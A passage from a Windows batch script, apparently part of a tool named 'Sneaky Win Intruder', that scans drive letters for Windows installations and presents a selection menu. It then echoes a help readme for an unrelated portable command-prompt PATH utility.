if exist %%i:\WinNT\nul (set /a count+=1 && set SWI!count!=!count!=%%i:\WinNT)
if exist %%i:\Windows\nul (set /a count+=1 && set SWI!count!=!count!=%%i:\Windows)
)
:: dir scan 2
if not defined debug cls
set num=0
for /f "usebackq" %%i in (`set SWI`) do set /a num+=1
if not "%num%"=="0" goto foundWin
echo 
echo ** ERROR: Cannot find Windows installation. Please specify it manually.
echo.
pause
goto start

:foundWin
echo.
echo :: Sneaky Win Intruder has found Windows installation(s).
echo.

for /f "usebackq delims== tokens=1-3" %%i in (`set SWI`) do echo    %%j. %%k&echo.

:: make a "go back" option as the last choice number
set /a numPlus=%num%+1
echo    A. Go back
echo.

:: create %butMinus% for nothin but just the A button as Go back, instead of 1234...
for /l %%i in (1,1,%num%) do set butMinus=!butMinus!%%i
call _choiceMulti /msg ":: Please make a choice: " /button %butMinus%A /errorlevel %numPlus%

:: check if user specifies 'go back'
if "%errorlevel%" EQU "%numPlus%" goto _menuChooseWin

set chosenwin=%errorlevel%
for /f "usebackq delims== tokens=1-3" %%i in (`set SWI%chosenwin%`) do set userwindir=%%k

goto start2

:_help

echo  ________________________________________________________________
echo.
echo    THIS DOC IS VERSION 1.0. 2.0 WILL BE OUT WITH FINAL RELEASE.
echo  ________________________________________________________________
echo. 
echo   E.C.P.P. Readme: 
echo.
echo   For use with Command Prompt Portable (i.e. CMD in a USB stick),
echo   with dirc.bat and listc.bat
echo.
echo   Run command line executables from any (sub)directories
echo   automatically.
echo.
echo   For example, I store my collection of commands in \Cmds, but
echo   some are very deep inside (\subfolder\subfolder, etc). To run
echo   a command I don't have to remember where it is, I simply enter 
echo   the command e.g. "dd" without going into any subfolder.
echo.
echo   It works by dynamically setting PATH to all (sub)directories
echo   where the script is run.
echo.
echo   Default supported exts: *.com *.exe *.bat *.cmd *.vbs *.vbe
echo   *.js *.jse *.wsf *.wsh *.msc (modifiable -- see comments)
echo.
echo   Required folder structures: 
echo.
echo   'Command Prompt Portable' -- the base folder (can be anywhere)
echo   '\Data\Batch' -- where batches reside: commandprompt, dirc, listc
echo   '\Exe' -- where all user-specified command line executables are
echo.
echo   They are what PATH specifies as well. (Modify below for more
echo   locations of PATH -- see comments)
echo.
echo   Designed for use together with dirc.bat and listc.bat, which lists
echo   the available executables inside subfolders I can run, so that I
echo   don't have to remember what the executable name is.
echo.
echo   For example, with "[Microsoft] [UnxUtils] addswap.exe, ..."
echo   as the screen output, I can list the content in Microsoft and
echo   UnxUtils folders by entering "dirc microsoft UnxUtils". For more
echo   info, enter "listc /?" or "dirc /?"
echo.
echo   Features Summary:
echo.
echo   - PATH is automatically and dynamically updated on each run
echo     (to detect new executables)
echo   - Only folders with executables is appended to PATH to save space
echo     (optional)
echo   - Display a welcome message when Command Prompt Portable is run,
echo     where it also shows a list of command line executables placed
echo     inside "CommandPromptPortable\Exe\" in the USB drive. Root
echo     executables are listed as file1.exe, file2.bat, ... folders are
echo     listed as [Folder1], [Folder2]...
echo   - Grouping of different cmds using folders: e.g. [Linux] [Windows]
echo     (And because to display all executables inside subfolders would
echo     consume too much screen space. They are not expanded unless you:)
echo   - Work with DirC.bat and ListC.bat to list executables in specified
echo     [folder(s)] to easily know the name of the executables that can 
echo     be run, e.g. "listC linux windows" (or dirc) would show all 
echo     executables inside [linux] and [windows] folders
echo   - Doesn't depend on a static location. Command Prompt Portable can
echo     be placed anywhere.
echo.
echo   Updates:
echo.
echo   - Version 1.1 now uses another dupe removal algorithm which is
echo     much faster, so dupe removal is now on by default. (To disable,
echo     add 'REM' before line 203-219 and remove 'REM' before line 182)
echo   - Improved codes.
echo.
echo   ________________________________________________________________
echo.
echo   CommandPrompt.bat
echo.
echo   Usage:
echo.
echo    - There's no need to specify a switch using this script, just run.
echo.
echo.
goto :EOF

